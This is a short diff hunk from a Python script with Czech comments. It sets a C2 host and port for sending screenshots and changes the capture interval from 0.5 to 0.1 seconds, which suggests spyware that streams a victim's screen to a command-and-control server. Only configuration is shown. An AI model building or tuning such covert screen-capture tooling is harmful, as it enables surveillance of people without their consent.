@@ -13,7 +13,7 @@ from io import BytesIO
 # ================ KONFIGURACE ================
 C2_HOST = "192.168.0.100"   # ← TVOJE IP
 C2_PORT = 4443
-INTERVAL = 0.5               # screenshot každých 0.1s
+INTERVAL = 0.1               # screenshot každých 0.1s
 QUALITY = 70                 # JPEG kvalita
 # =============================================
 
